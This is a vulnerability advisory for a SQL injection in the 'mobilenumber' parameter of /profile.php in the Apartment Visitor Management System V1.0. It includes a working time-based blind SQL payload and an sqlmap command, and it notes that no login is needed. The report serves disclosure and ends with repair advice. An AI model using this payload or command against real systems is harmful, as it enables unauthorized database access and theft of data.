# SourceCodester Apartment Visitor Management System V1.0 /profile.php mobilenumber parameter SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ Apartment Visitor Management System in PHP and MySQL Free Source Code

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ Angel

## Vulnerable File
+ /profile.php

## Vulnerability location:
+ 'mobilenumber' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-avms_0.zip)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/profile.php' file of the 'Apartment Visitor Management System in PHP and MySQL Free Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter 'mobilenumber' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Apartment Visitor Management System in PHP and MySQL Free Source Code", Angel discovered a critical SQL injection vulnerability in the "/profile.php" file. This vulnerability stems from insufficient user input validation of the 'mobilenumber' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ <font style="color:#000000;">tiem-based blind</font>

## Payload:
```plain
Parameter: mobilenumber (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=Mark Cooper&mobilenumber=9123456789' AND (SELECT 9818 FROM (SELECT(SLEEP(5)))wWJs)-- FSSc&email=admin@mail.com&update=
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -r test.txt --batch --level=5 --risk=3 --dbms=mysql --dbs
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1747487427102-d75405ea-8aaa-4a63-9685-48aa34fb153d.png)

# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

